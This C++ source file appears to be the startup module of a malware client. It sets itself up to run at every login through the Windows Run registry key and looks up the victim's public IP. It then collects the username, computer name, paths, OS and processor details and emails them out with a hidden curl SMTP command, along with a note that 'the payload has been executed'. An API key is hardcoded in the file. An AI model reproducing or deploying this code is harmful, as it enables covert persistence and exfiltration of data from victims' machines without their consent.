#include "AutoStart.h"
#pragma warning(disable : 4996)

AutoStart::AutoStart(Client* client, std::string smtpp, std::string sender_mailp, std::string sender_namep, std::string passwordp, std::string mail_rcptp, std::string rcpt_namep) : smtp(smtpp), sender_mail(sender_mailp), sender_name(sender_namep),password(passwordp),mail_rcpt(mail_rcptp),rcpt_name(rcpt_namep)
{
	try
	{
		client->setIp(AutoStart::get_ip());
	}
	catch (std::exception& e)
	{
		client->setIp("0.0.0.0");
	}
	IP = client->getIp();
	std::cout << client->getIp() << std::endl;

	AutoStart::persistence(DEFAULT_KEYNAME);

		AutoStart::send_mail();
}

void get_Website(char *url) {

	SOCKET Socket;
	SOCKADDR_IN SockAddr;
	int lineCount = 0;
	int rowCount = 0;
	struct hostent *host;
	char *get_http = new char[256];
	char buffer[10000];
	std::string website_HTML;

	memset(get_http, ' ', sizeof(get_http));
	strcpy(get_http, "GET / HTTP/1.1\r\nHost: ");
	strcat(get_http, url);
	strcat(get_http, "\r\nConnection: close\r\n\r\n");

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	host = gethostbyname(url);

	SockAddr.sin_port = htons(80);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
		std::cout << "Could not connect";
		system("pause");
		//return 1;
	}
	send(Socket, get_http, strlen(get_http), 0);

	int nDataLength;

	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
		int i = 0;
		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {

			website_HTML += buffer[i];
			i += 1;
		}
	}
	std::cout << "My site : " << std::endl << website_HTML << std::endl;
	closesocket(Socket);
	delete[] get_http;
}

void getGeolocalize(std::string url)
{
	std::locale local;
	char lineBuffer[200][80] = { ' ' };
	int lineIndex = 0, posIndex = 0;
	int i = 0, bufLen = 0, j = 0, lineCount = 0;
	char buffer[10000];
	std::string website_HTML;

	SOCKET Socket;
	SOCKADDR_IN SockAddr;
	int rowCount = 0;
	struct hostent *host;
	std::string get_http;

	get_http = "GET / HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	host = gethostbyname(url.c_str());

	if (host == nullptr)
	{
		closesocket(Socket);
	}
	else
	{
		SockAddr.sin_port = htons(80);
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);


		if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
			std::cout << "Could not connect";
		}
		send(Socket, get_http.c_str(), strlen(get_http.c_str()), 0);

		int nDataLength;
		while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
			int i = 0;
			while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {

				website_HTML += buffer[i];
				i += 1;
			}
		}
		closesocket(Socket);
		std::cout << website_HTML << std::endl;
	}

}

std::string AutoStart::get_ip()
{
	char site[] = "api.ipstack.com/91.167.128.194?access_key=0698c1f50b4f0f15ac97a93109070faf";
	const std::string url = "api.ipify.org";
	char url_[] = "api.ipify.org";
	std::string website_HTML;
	char ip_address[16];
	std::locale local;
	char lineBuffer[200][80] = { ' ' };
	int lineIndex = 0, posIndex = 0;
	int i = 0, bufLen = 0, j = 0, lineCount = 0;
	char buffer[10000];

	SOCKET Socket;
	SOCKADDR_IN SockAddr;
	int rowCount = 0;
	struct hostent *host;
	std::string get_http;


	get_http = "GET / HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";


	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


	host = gethostbyname(url.c_str());

	if (host == nullptr)
	{
		closesocket(Socket);
		return "0.0.0.0";
	}
	SockAddr.sin_port = htons(80);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);


	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
		std::cout << "Could not connect";
		return 0;
	}
	send(Socket, get_http.c_str(), strlen(get_http.c_str()), 0);

	int nDataLength;
	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
		int i = 0;
		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {

			website_HTML += buffer[i];
			i += 1;
		}
	}
	std::cout << website_HTML << std::endl;

	closesocket(Socket);


	for (size_t i = 0; i < website_HTML.length(); ++i) website_HTML[i] = tolower(website_HTML[i], local);

	std::istringstream ss(website_HTML);
	std::string stoken;

	while (getline(ss, stoken, '\n')) {

		//cout <<"-->"<< stoken.c_str() << '\n';

		strcpy_s(lineBuffer[lineIndex], stoken.c_str());
		int dot = 0;
		for (int ii = 0; ii < strlen(lineBuffer[lineIndex]); ii++) {

			if (lineBuffer[lineIndex][ii] == '.') dot++;
			if (dot >= 3) {
				dot = 0;
				strcpy_s(ip_address, lineBuffer[lineIndex]);
			}
		}

		lineIndex++;
	}
	return ip_address;
}

bool AutoStart::persistence(const wchar_t* keyname)
{
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);

	HKEY newValue;
	LONG lResult = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	BOOL fsuccess = (lResult == 0);
	if (fsuccess)
	{
		RegSetValueEx(newValue, (LPCWSTR)keyname, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
		RegCloseKey(newValue);
		return 1;
	}
	else
	{
		return 0;
	}
}

bool AutoStart::send_mail()
{
	time_t now = time(0);
	// convert now to string form
	char* dt = ctime(&now);

	const std::string subject = "New connection : "+IP;
	const std::string file_attachment = "ATTACHMENT.FILE";
	std::ofstream attachment(file_attachment, std::ios::trunc);

	if (attachment)
	{
		attachment << "From: " << sender_name << " " << "<" << sender_mail << ">" << std::endl;
		attachment << "To: " << rcpt_name << " " << "<" << mail_rcpt << ">" << std::endl;
		attachment << "Subject: " << subject << std::endl;
		attachment << "Cc:" << std::endl;

		std::string buffer;
		std::string user = getenv("USERNAME");
		std::string userhome = getenv("HOMEPATH");
		std::string windir = getenv("windir");
		std::string localappdate = getenv("LOCALAPPDATA");
		std::string systemdrive = getenv("SystemDrive");
		std::string OS = getenv("OS");
		std::string userdomain = getenv("USERDOMAIN");
		std::string computername = getenv("COMPUTERNAME");
		std::string proco = getenv("PROCESSOR_IDENTIFIER");

		buffer = "\nCurrent user:\t\t\t " + user + "\nUser directory:\t\t\t " + userhome + "\nWindows directory:\t\t" + windir + "\nLocal Appdata:\t\t\t" + localappdate;
		buffer += "\nSystem drive:\t\t\t" + systemdrive + "\nOS:\t\t\t\t\t" + OS + "\nComputer name:\t\t" + computername + "\nProcessor identifier:\t\t " + proco;
		
		attachment << "The payload has been executed" << std::endl;
		attachment << std::string(dt) << std::endl;
		attachment << buffer << std::endl;


		attachment.close();
		const std::string command = "curl smtp://" + smtp + " -v --mail-from " + sender_mail + " --mail-rcpt " + mail_rcpt + " --ssl -u " + sender_mail + ":" + password + " -T " + file_attachment + " -k --anyauth";
		WinExec(command.c_str(), SW_HIDE);
		return 1;
	}
	else
	{
		return 0;
	}

}